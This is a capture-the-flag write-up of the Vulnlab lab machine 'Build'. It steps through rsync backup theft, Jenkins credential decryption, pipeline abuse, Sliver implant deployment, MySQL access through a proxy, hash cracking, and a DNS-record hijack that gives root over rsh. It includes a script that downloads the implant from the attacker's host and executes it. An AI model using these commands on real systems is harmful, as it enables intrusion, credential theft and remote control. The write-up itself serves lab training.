---
layout: post.njk
title: "Vulnlab :: Build Writeup"
date: 2025-01-04T19:54:32+01:00
tags: [posts, vulnlab, ctf, misconfigurations, jenkins, gitea, sliver, rsync]
summary: "Chaining a Gitea leak, a Jenkins credential decrypt, Sliver shell access and a PowerDNS/RSH privesc to root a Vulnlab box."
permalink: /blog/build-vl/
---

## Enumeration

### Nmap Scan

I started by performing a standard nmap scan:

```
exegol-VulnLab /workspace # nmap -sCV --min-rate 5000 -p- 10.10.104.46
Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-31 19:53 CET
Nmap scan report for 10.10.104.46
Host is up (0.033s latency).
Not shown: 65526 closed tcp ports (reset)
PORT     STATE    SERVICE         VERSION
22/tcp   open     ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 472173e26b96cdf91311af40c84dd67f (ECDSA)
|_  256 2b5ebaf372d3b309df25412909f47bf5 (ED25519)
53/tcp   open     domain          PowerDNS
| dns-nsid:
|   NSID: pdns (70646e73)
|_  id.server: pdns
512/tcp  open     exec            netkit-rsh rexecd
513/tcp  open     login?
514/tcp  open     shell           Netkit rshd
873/tcp  open     rsync           (protocol version 31)
3000/tcp open     ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=d2c9c1889c1be19e; Path=/; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 31 Dec 2024 18:53:18 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <title>Gitea: Git with a cup of tea</title>
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
3306/tcp filtered mysql
8081/tcp filtered blackice-icecap
```

## HTTP - Port 3000

Port 3000 is running Gitea, which hosts a single public repository.

### Gitea

The public repository contains a Jenkins pipeline configuration.

## Rsync

```sh
rsync -av --list-only rsync://10.10.104.46
```

```sh
rsync -av --list-only rsync://10.10.104.46/backups/
```

The machine also exposes an rsync service, which contains a Jenkins backup.

```sh
rsync -av rsync://10.10.104.46/backups ./sdf
```

## Backup

### Jenkins Credentials Decryptor

With access to the Jenkins backup, I used the [jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor) tool to decrypt the password for the `buildadm` user.

```sh
nix profile install github:hoto/jenkins-credentials-decryptor
```

```sh
jenkins-credentials-decryptor \
       -m ./secrets/master.key \
       -s ./secrets/hudson.util.Secret \
       -c ./jobs/build/config.xml \
       -o json
```

I can now log into Gitea using these credentials.

## Shell Access

Next, I uploaded the Sliver implant to the target machine via the pipeline.

### Sliver

```
sliver > generate --mtls 10.8.4.230:8888 --os Linux --arch 64
```

```
sliver > mtls --lport 8888
```

### Implant Upload

`sh.sh`

```sh
#!/bin/env bash

curl http://10.8.4.230/LAZY_POLO -o /tmp/LAZY_POLO && \
    chmod +x /tmp/LAZY_POLO && \
    /tmp/LAZY_POLO
```

`HTTP Server`

```sh
python3 -m http.server
```

```
sliver > use fff759cb-5de0-49bd-990b-aec6b0a1db35
```

```
sliver (LAZY_POLO) > shell
```

I successfully gained shell access and retrieved the first flag.

It appears that I am inside a container.

## MySQL Server

```
3306/tcp filtered mysql
```

Using a proxy, I was able to log into the MySQL server as root.

### Sliver socks5

```
sliver (LAZY_POLO) > socks5 start
```

> Remember to properly configure proxychains!

```sh
proxychains4 mysql -u root -h 172.18.0.1 --skip-ssl
```

### PowerDNS

From the PowerDNS database, I obtained the administrator password using hashcat.

### hashcat

```sh
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

## Privilege Escalation

### PowerDNS

```
select * from history;
```

In the database's `history` table, I found several IP addresses, and one of them led to the PowerDNS admin panel.

`172.18.0.6`

### RSH

```
rsh 10.10.104.46
```

After setting my own IP address as the `intern` DNS record and using the `rsh` client, I gained root access.
